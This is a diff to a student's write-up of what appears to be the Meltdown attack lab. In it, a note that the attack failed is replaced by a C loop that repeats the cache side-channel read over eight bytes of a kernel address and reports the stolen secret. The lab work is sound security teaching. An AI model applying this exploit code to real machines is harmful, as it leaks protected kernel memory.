@@ -52,7 +52,7 @@ The Secret = 7.
 
 # Task 7
 
-## Taks 7.1
+## Task 7.1
 
 It shows
 
@@ -72,17 +72,67 @@ Somehow, it still fails to steal the actual secret value. Even though I tried ma
 
 ## Task 8
 
-The attack fails.
+Yes, it prints the first letter of the secret message.
 
-I find that probably I cannot reproduce the attack according to the instruction. Because in the *lab environment* mentions:
+To get the entire 8-byte secret message. I modified the code: nest the code in the main function into such a loop:
 
-> First, the Meltdown vulnerability is a flaw inside Intel CPUs, so if a student’s machine is an AMD machine, the attack will not work. Second, Intel is working on fixing this problem in its CPUs, so if a student’s computer uses new Intel CPUs, the attack may not work
+```c
+for (int k = 0; k < 8; k++)
+{
 
-The virtual machine still relies on the hardwares of my computer **physically**, which is equipped with [the last 10th intel CPU](https://ark.intel.com/content/www/us/en/ark/products/196597/intel-core-i7-1065g7-processor-8m-cache-up-to-3-90-ghz.html):
+    memset(scores, 0, sizeof(scores));
 
-![Basic info about my computer](./cpu.png)
+    flushSideChannel();
 
-So I need to do the lab on another computer.
+    // Retry 1000 times on the same address.
+
+    for (i = 0; i < 1000; i++)
+    {
+
+        ret = pread(fd, NULL, 0, 0);
+
+        if (ret < 0)
+        {
+
+            perror("pread");
+
+            break;
+        }
+
+        // Flush the probing array
+
+        for (j = 0; j < 256; j++)
+
+            _mm_clflush(&array[j * 4096 + DELTA]);
+
+        if (sigsetjmp(jbuf, 1) == 0)
+        {
+            meltdown_asm(0xf881c000 + k);
+        }
+
+        reloadSideChannelImproved();
+    }
+
+    // Find the index with the highest score.
+
+    int max = 0;
+
+    for (i = 0; i < 256; i++)
+    {
+
+        if (scores[max] < scores[i])
+            max = i;
+    }
+
+    printf("The secret value is %d %c\n", max, max);
+
+    printf("The number of hits is %d\n", scores[max]);
+}
+```
+
+And finally, I successfully stole the secret message:
+
+![](./attack.png)
 
 
 
